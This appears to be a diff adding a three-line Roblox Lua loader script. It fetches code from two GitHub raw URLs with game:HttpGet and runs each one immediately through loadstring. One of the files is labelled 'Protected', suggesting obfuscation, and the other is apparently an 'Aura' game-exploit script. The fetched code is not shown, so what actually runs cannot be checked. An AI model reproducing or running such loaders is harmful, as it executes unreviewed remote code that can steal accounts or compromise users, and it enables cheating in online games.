@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/damir512/somesimgaguyidk/main/Protected_9253831134277210.txt",true))()
+task.wait(0.1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JakeScripterz/1x1x1x1/refs/heads/main/Aura"))()
